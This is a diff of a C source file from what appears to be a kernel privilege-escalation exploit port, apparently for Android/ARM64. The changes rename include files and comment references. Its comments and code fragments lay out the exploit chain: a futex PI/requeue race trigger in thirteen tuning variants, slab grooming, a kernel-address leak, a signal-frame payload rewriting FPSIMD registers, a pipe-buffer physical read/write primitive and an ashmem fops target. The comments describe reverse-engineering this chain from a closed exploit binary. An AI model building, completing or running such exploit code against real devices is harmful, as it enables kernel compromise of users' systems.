@@ -15,7 +15,7 @@
  *      has reached the expected "wait_requeue_pi ret=-1 errno=110"
  *      cleanly in every single test run this session -- the futex setup
  *      itself has never once been the crash site. Reused here (like
- *      kernelsnitch.h and groom.c's grooming choreography) rather than
+ *      03_mm_address_sidechannel/mm_address_leak.h and 05_mm_slab_grooming.c's grooming choreography) rather than
  *      re-derived, because it is proven correct.
  *
  * source order, confirmed against FUN_001044f4: the closed binary calls
@@ -35,9 +35,9 @@
 #include <time.h>
 #include <unistd.h>
 
-#include "futex_trigger.h"
-#include "pipe_physrw.h"
-#include "sigusr1_payload.h"
+#include "07_futex_pi_trigger.h"
+#include "09_pipe_buffer_rw.h"
+#include "06_signal_frame_payload.h"
 
 #define FUTEX_LOCK_PI 6
 #define FUTEX_UNLOCK_PI 7
@@ -145,13 +145,13 @@ static uint64_t g_v14_delay_cycles;
  * not milliseconds) via a tight yield-loop before firing.
  *
  * CORRECTED THIS SESSION: earlier ported this using this project's own
- * src/main.c 8-entry table (`{5000, 0, 10000, 30000, -5000, 20000,
+ * src/00_orchestrator.c 8-entry table (`{5000, 0, 10000, 30000, -5000, 20000,
  * 15000, 25000}`, real `.rodata` offset 0x243c, 4-byte int32 entries),
  * assuming it was the SAME table reused for a second purpose here. It
  * is not -- re-verified with `r2 -qc "s 0x2240; px 64"` (raw bytes,
  * bypassing any address-translation mistake) and found a DIFFERENT
  * table at raw vaddr 0x2240, 8-byte int64 entries (confirmed by the
- * `uxtw 3` = `*8` index scaling in the disasm, vs `*4` for main.c's
+ * `uxtw 3` = `*8` index scaling in the disasm, vs `*4` for 00_orchestrator.c's
  * table): `{0, 0x10, 0x20, 0x30, 0x40, 0x60, 0x80, 0x18}` = `{0, 16,
  * 32, 48, 64, 96, 128, 24}`. The earlier value used here (5000) was
  * simply wrong -- not close to any real table entry -- which is a
@@ -228,7 +228,7 @@ static atomic_int route_done;
 static atomic_int waiter_tid_g;
 
 /* source: FUN_00103e18's sigaction+tgkill+FPSIMD-rewrite sequence, see
- * sigusr1_payload.h for the full derivation. Disabled by default
+ * 06_signal_frame_payload.h for the full derivation. Disabled by default
  * (`run_futex_trigger`/`run_futex_trigger_cb` behave exactly as
  * before, unaffected) -- only `run_futex_trigger_full()` enables this,
  * since it needs real page_base/ashmem_misc_fops_addr values to build
@@ -809,7 +809,7 @@ int run_futex_trigger_full(uint64_t page_base, uint64_t ashmem_misc_fops_addr,
 }
 
 /* source: fcn.000044f4 (app_main), fresh re-disasm this session -- see
- * futex_trigger.h's comment above run_futex_trigger_v4_cb() for the
+ * 07_futex_pi_trigger.h's comment above run_futex_trigger_v4_cb() for the
  * full derivation of the four corrections applied here on top of the
  * already-byte-accurate waiter_thread_fn/owner_thread_fn (unchanged,
  * reused as-is). This is the calling thread's own body (app_main IS
@@ -929,7 +929,7 @@ int run_futex_trigger_v4_full(uint64_t page_base,
 
 /* source: fcn.00004300 (real consumer thread), fresh re-disassembly
  * this session -- see run_futex_trigger_v5_cb()'s comment in
- * futex_trigger.h for the full derivation. Genuinely separate thread
+ * 07_futex_pi_trigger.h for the full derivation. Genuinely separate thread
  * from the calling/app_main-equivalent thread, pinned to CPU 1 (its
  * real first action, raw vaddr 0x4324), firing sched_setattr on the
  * waiter's tid as soon as that tid is known -- not gated on
@@ -1064,7 +1064,7 @@ int run_futex_trigger_v5_full(uint64_t page_base,
 
 /* source: raw vaddr 0x40d8-0x4160 (waiter, fcn.00003e18) cross-
  * referenced against raw vaddr 0x44ac-0x44bc (consumer, fcn.00004300) --
- * see run_futex_trigger_v6_cb()'s comment in futex_trigger.h for the
+ * see run_futex_trigger_v6_cb()'s comment in 07_futex_pi_trigger.h for the
  * full derivation. G+0x750/G+0x760 real handshake, ported as
  * g_sched_setattr_done/g_sched_setattr_ok. */
 static atomic_int g_sched_setattr_done;
@@ -1288,7 +1288,7 @@ int run_futex_trigger_v6_full(uint64_t page_base,
   return ret;
 }
 
-/* source: see run_futex_trigger_v7_cb()'s comment in futex_trigger.h
+/* source: see run_futex_trigger_v7_cb()'s comment in 07_futex_pi_trigger.h
  * for the full derivation. g_sigusr1_done signals the SAME thing the
  * real G+0x76c pulse does (waiter's SIGUSR1 handler succeeded) --
  * consumer_thread_fn_v7 gates on it before calling sched_setattr,
@@ -1502,7 +1502,7 @@ int run_futex_trigger_v7_full(uint64_t page_base,
 }
 
 /* source: this project's own hypothesis, not the closed binary -- see
- * run_futex_trigger_v8_cb()'s comment in futex_trigger.h for the full
+ * run_futex_trigger_v8_cb()'s comment in 07_futex_pi_trigger.h for the full
  * derivation (interrupt the owner thread's blocked second LOCK_PI
  * right as the waiter's SIGUSR1 payload lands, testing for a UAF
  * window in the kernel's interrupted-PI-wait cleanup path). */
@@ -1751,7 +1751,7 @@ int run_futex_trigger_v8_full(uint64_t page_base,
 }
 
 /* source: this project's own experiment, fixing v8's own race -- see
- * run_futex_trigger_v9_cb()'s comment in futex_trigger.h. Reuses
+ * run_futex_trigger_v9_cb()'s comment in 07_futex_pi_trigger.h. Reuses
  * owner_thread_fn_v8/consumer_thread_fn_v8 unchanged; only the waiter
  * differs, adding a real delay between signaling owner and this
  * thread's own UNLOCK_PI call. */
@@ -1935,7 +1935,7 @@ int run_futex_trigger_v9_full(uint64_t page_base,
 }
 
 /* source: real fcn.00003e18 0x40d4-0x4164 + fcn.00004300 0x4494-0x44bc,
- * see futex_trigger.h's run_futex_trigger_v10_cb comment for the full
+ * see 07_futex_pi_trigger.h's run_futex_trigger_v10_cb comment for the full
  * derivation. Reuses owner_thread_fn_v8/consumer_thread_fn_v8
  * unchanged -- the consumer already waits for g_sigusr1_done then sets
  * g_sched_setattr_done right after sched_setattr, which is already
@@ -2140,7 +2140,7 @@ int run_futex_trigger_v10_full(uint64_t page_base,
   return ret;
 }
 
-/* source: see futex_trigger.h's run_futex_trigger_v11_cb comment --
+/* source: see 07_futex_pi_trigger.h's run_futex_trigger_v11_cb comment --
  * v10's waiter body (no SIGUSR2/delay to owner, yield-spin bounded to
  * ~1s instead of a raw cycle count) with v6's callback-from-waiter
  * gate restored, since fresh disassembly of consumer_thread_fn_v8's
@@ -2206,7 +2206,7 @@ static void *waiter_thread_fn_v11(void *arg) {
       }
       /* source: raw vaddr 0x4144-0x4154 -- verify() called from THIS
        * thread, gated on G+0x760 (g_sched_setattr_ok) >= 1. Restored
-       * from v6 after confirming (see futex_trigger.h) that the gate
+       * from v6 after confirming (see 07_futex_pi_trigger.h) that the gate
        * genuinely opens -- v10's belief that it never does was based
        * on a static search that missed an LSE atomic-increment write. */
       if (atomic_load(&g_sched_setattr_ok) && g_post_cb != NULL) {
@@ -2379,7 +2379,7 @@ static void *waiter_thread_fn_v12(void *arg) {
        * tid from the consumer (0x4100-0x4128, ~1s bound). */
       /* source: raw vaddr 0x4108-0x4128 -- real bound is a plain
        * iteration count (0x3b9ac9ff), not a cntvct_el0 time check --
-       * see futex_trigger.h's run_futex_trigger_v12_cb comment. */
+       * see 07_futex_pi_trigger.h's run_futex_trigger_v12_cb comment. */
       for (uint64_t spins = 0;
            spins < 0x3b9ac9ffULL && !atomic_load(&g_sched_setattr_done);
            spins++) {
@@ -2387,7 +2387,7 @@ static void *waiter_thread_fn_v12(void *arg) {
       }
       /* source: raw vaddr 0x4144-0x4154 -- verify() called from THIS
        * thread, gated on G+0x760 (g_sched_setattr_ok) >= 1. Restored
-       * from v6 after confirming (see futex_trigger.h) that the gate
+       * from v6 after confirming (see 07_futex_pi_trigger.h) that the gate
        * genuinely opens -- v10's belief that it never does was based
        * on a static search that missed an LSE atomic-increment write. */
       if (atomic_load(&g_sched_setattr_ok) && g_post_cb != NULL) {
@@ -2513,7 +2513,7 @@ int run_futex_trigger_v12_full(uint64_t page_base,
   return ret;
 }
 
-/* source: see futex_trigger.h's run_futex_trigger_v13_cb comment --
+/* source: see 07_futex_pi_trigger.h's run_futex_trigger_v13_cb comment --
  * bisection axis B alone: SIGUSR2+300ms delay to owner KEPT (identical
  * to waiter_thread_fn_v9), busy-spin (v12's byte-accurate iteration
  * count) swapped in for the usleep-poll. */
